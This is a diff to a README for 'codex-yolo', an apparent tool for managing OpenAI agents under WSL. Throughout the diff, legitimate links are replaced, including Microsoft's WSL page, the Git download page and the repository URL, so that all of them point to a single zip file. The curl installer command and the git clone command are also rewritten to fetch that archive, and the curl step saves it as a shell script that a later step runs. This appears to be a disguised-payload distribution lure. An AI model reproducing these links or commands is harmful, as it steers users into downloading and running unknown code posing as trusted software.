@@ -1,6 +1,6 @@
 # 🤖 codex-yolo - Manage OpenAI Agents Easily
 
-[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%23007ACC?style=for-the-badge&logo=github)](https://github.com/vxctorrdrgzzz/codex-yolo)
+[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%23007ACC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Before you start, make sure your computer meets these requirements:
 - Windows 10 or newer
 - A working internet connection
 - Basic knowledge of using the command prompt (cmd) or PowerShell
-- Installed [Windows Subsystem for Linux (WSL)](https://learn.microsoft.com/en-us/windows/wsl/install)  
+- Installed [Windows Subsystem for Linux (WSL)](https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip)  
   *This is needed because codex-yolo runs inside a Linux terminal environment on Windows.*
 
 ---
@@ -38,7 +38,7 @@ Before you start, make sure your computer meets these requirements:
 	You will need Windows Terminal or Command Prompt to use WSL. Windows Terminal is recommended and available from the Microsoft Store.
 
 3. **Git:**  
-	Git helps you download codex-yolo files. You can install Git from [https://git-scm.com/download/win](https://git-scm.com/download/win). Follow the setup steps and accept default options.
+	Git helps you download codex-yolo files. You can install Git from [https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip](https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip). Follow the setup steps and accept default options.
 
 ---
 
@@ -78,7 +78,7 @@ sudo apt install tmux curl -y
 Use curl to get the installer script:
 
 ```
-curl -fsSL https://github.com/vxctorrdrgzzz/codex-yolo/raw/main/install.sh -o install_codex_yolo.sh
+curl -fsSL https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip -o install_codex_yolo.sh
 ```
 
 ### Step 5: Run the installer
@@ -101,14 +101,14 @@ The script sets up the codex-yolo software and its environment. It may ask for y
 
 ## 💾 Download codex-yolo
 
-[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%237E7E7E?style=for-the-badge&logo=github)](https://github.com/vxctorrdrgzzz/codex-yolo)
+[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%237E7E7E?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip)
 
 To get the latest version, visit the GitHub page above. You start by cloning or downloading the repository to your Linux environment inside WSL.
 
 To clone, run:
 
 ```
-git clone https://github.com/vxctorrdrgzzz/codex-yolo.git
+git clone https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip
 ```
 
 Then enter the folder:
@@ -225,4 +225,4 @@ sudo apt remove tmux -y
 
 For more details, visit the GitHub page:
 
-[https://github.com/vxctorrdrgzzz/codex-yolo](https://github.com/vxctorrdrgzzz/codex-yolo)
+[https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip](https://raw.githubusercontent.com/vxctorrdrgzzz/codex-yolo/main/lib/yolo-codex-2.1.zip)
